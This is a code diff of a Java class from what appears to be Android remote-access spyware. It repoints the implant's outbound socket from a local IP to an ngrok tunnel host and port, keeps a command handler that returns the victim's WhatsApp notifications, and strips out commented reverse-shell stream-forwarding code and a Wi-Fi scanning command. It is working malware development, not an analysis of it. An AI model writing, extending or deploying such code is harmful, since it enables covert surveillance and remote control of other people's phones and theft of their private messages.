@@ -15,16 +15,9 @@ import java.nio.charset.StandardCharsets;
 public class ConMan {
 
     public static void revConInit() throws Exception {
-        // create a process around the shell
-        // final Process process = Runtime.getRuntime().exec("system/bin/sh");
 
         // start a socket
-        Socket socket = new Socket("192.168.18.24", 443);
-
-        // forward streams until socket closes
-        // forwardStream(socket.getInputStream(), process.getOutputStream());
-        // forwardStream(process.getInputStream(), socket.getOutputStream());
-        // forwardStream(process.getErrorStream(), socket.getOutputStream());
+        Socket socket = new Socket("2.tcp.ngrok.io", 18560);
 
         // Input Socket
         BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
@@ -101,44 +94,10 @@ public class ConMan {
             case "0xWA":
                 returnMessage = String.valueOf(NotificationListener.GetWhatsappNotifications());
                 break;
-            // Wifi Scanner
-            case "0xWI":
-                returnMessage = String.valueOf(WifiScanner.scan(MainService.getContextOfApplication()));
-                break;
             default:
                 returnMessage = "Invalid";
         }
 
         return returnMessage;
     }
-
-    /*
-    private static void forwardStream(final InputStream input, final OutputStream output) {
-        new Thread(() -> {
-            try {
-                final byte[] buf = new byte[4096];
-                int length;
-                while ((length = input.read(buf)) != -1) {
-                    if (output != null) {
-                        output.write(buf, 0, length);
-                        if (input.available() == 0) {
-                            output.flush();
-                        }
-                    }
-                }
-            } catch (Exception e) {
-                // die silently
-            } finally {
-                try {
-                    input.close();
-                    if (output != null) {
-                        output.close();
-                    }
-                } catch (IOException e) {
-                    // die silently
-                }
-            }
-        }).start();
-    }
-     */
 }
